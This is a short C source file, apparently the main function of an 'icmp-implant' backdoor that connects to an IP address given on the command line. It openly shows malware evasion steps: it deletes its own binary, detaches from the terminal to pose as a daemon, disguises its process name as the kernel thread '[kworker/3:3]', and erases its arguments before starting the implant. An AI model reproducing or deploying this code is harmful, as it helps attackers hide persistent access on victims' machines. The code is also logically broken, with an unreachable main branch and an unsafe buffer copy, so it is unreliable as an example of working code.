#include "../include/implant.h"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Error: Specify the IP address to connect to as an argument\n");
        return 1;
    } else if (argc == 1) {
        char target[strlen(argv[1])];
        memmove(target, argv[1], strlen(target));

        // remove implant upon execution
        unlink(argv[0]);

        // detach from tty to impersonate a daemon
        ioctl(0, TIOCNOTTY);

        // save the arg for later
        memmove(target, argv[1], strlen(argv[1]) + 1);

        // process masquerading, change the command name associated with the process (/proc/<pid>/comm)
        prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
        memmove(argv[0], "[kworker/3:3]", strlen(argv[0]) + 1);
        memmove(argv[1], "\0", strlen(argv[1]));

        implant_init_n_call(target);
    } else {
        fprintf(stdout, "Usage: ./icmp-implant [IP-ADDRESS]");
    }
    return 0;
}